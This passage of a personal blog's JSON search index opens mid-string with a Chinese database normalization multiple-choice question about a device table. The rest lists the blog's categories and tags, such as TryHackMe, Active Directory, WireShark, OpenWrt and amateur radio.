对设备管理，请分析关系模式：设备(设备编号, 设备名, 生产商编号，生产商名称，生产商地址，配件编号，配件名称，配件价格，设备价格)，说法正确的是_______________。 A.不满足第2范式 B.满足第2范式但不满足第3范式 C.满足第3范式 D.其他不对","categories":[{"name":"学习","slug":"学习","permalink":"https://blog.irec.moe/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://blog.irec.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"数据库","slug":"数据库","permalink":"https://blog.irec.moe/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]}],"categories":[{"name":"THM","slug":"THM","permalink":"https://blog.irec.moe/categories/THM/"},{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"},{"name":"无线电","slug":"无线电","permalink":"https://blog.irec.moe/categories/%E6%97%A0%E7%BA%BF%E7%94%B5/"},{"name":"生活","slug":"生活","permalink":"https://blog.irec.moe/categories/%E7%94%9F%E6%B4%BB/"},{"name":"网络","slug":"网络","permalink":"https://blog.irec.moe/categories/%E7%BD%91%E7%BB%9C/"},{"name":"学习","slug":"学习","permalink":"https://blog.irec.moe/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://blog.irec.moe/tags/Windows/"},{"name":"Active Directory","slug":"Active-Directory","permalink":"https://blog.irec.moe/tags/Active-Directory/"},{"name":"栈","slug":"栈","permalink":"https://blog.irec.moe/tags/%E6%A0%88/"},{"name":"群晖","slug":"群晖","permalink":"https://blog.irec.moe/tags/%E7%BE%A4%E6%99%96/"},{"name":"硬盘","slug":"硬盘","permalink":"https://blog.irec.moe/tags/%E7%A1%AC%E7%9B%98/"},{"name":"灵车","slug":"灵车","permalink":"https://blog.irec.moe/tags/%E7%81%B5%E8%BD%A6/"},{"name":"短波","slug":"短波","permalink":"https://blog.irec.moe/tags/%E7%9F%AD%E6%B3%A2/"},{"name":"比赛","slug":"比赛","permalink":"https://blog.irec.moe/tags/%E6%AF%94%E8%B5%9B/"},{"name":"卫星","slug":"卫星","permalink":"https://blog.irec.moe/tags/%E5%8D%AB%E6%98%9F/"},{"name":"网卡","slug":"网卡","permalink":"https://blog.irec.moe/tags/%E7%BD%91%E5%8D%A1/"},{"name":"电池","slug":"电池","permalink":"https://blog.irec.moe/tags/%E7%94%B5%E6%B1%A0/"},{"name":"无线电","slug":"无线电","permalink":"https://blog.irec.moe/tags/%E6%97%A0%E7%BA%BF%E7%94%B5/"},{"name":"银行卡","slug":"银行卡","permalink":"https://blog.irec.moe/tags/%E9%93%B6%E8%A1%8C%E5%8D%A1/"},{"name":"羊毛","slug":"羊毛","permalink":"https://blog.irec.moe/tags/%E7%BE%8A%E6%AF%9B/"},{"name":"光猫","slug":"光猫","permalink":"https://blog.irec.moe/tags/%E5%85%89%E7%8C%AB/"},{"name":"VR","slug":"VR","permalink":"https://blog.irec.moe/tags/VR/"},{"name":"续命","slug":"续命","permalink":"https://blog.irec.moe/tags/%E7%BB%AD%E5%91%BD/"},{"name":"保健","slug":"保健","permalink":"https://blog.irec.moe/tags/%E4%BF%9D%E5%81%A5/"},{"name":"WireShark","slug":"WireShark","permalink":"https://blog.irec.moe/tags/WireShark/"},{"name":"经验","slug":"经验","permalink":"https://blog.irec.moe/tags/%E7%BB%8F%E9%AA%8C/"},{"name":"OpenWrt","slug":"OpenWrt","permalink":"https://blog.irec.moe/tags/OpenWrt/"},{"name":"WireGuard","slug":"WireGuard","permalink":"https://blog.irec.moe/tags/WireGuard/"},{"name":"OpenClash","slug":"OpenClash","permalink":"https://blog.irec.moe/tags/OpenClash/"},{"name":"PC","slug":"PC","permalink":"https://blog.irec.moe/tags/PC/"},{"name":"考试","slug":"考试","permalink":"https://blog.irec.moe/tags/%E8%80%83%E8%AF%95/"},{"name":"升学","slug":"升学","permalink":"https://blog.irec.moe/tags/%E5%8D%87%E5%AD%A6/"},{"name":"笔记","slug":"笔记","permalink":"https://blog.irec.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"数据库","slug":"数据库","permalink":"https://blog.irec.moe/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]}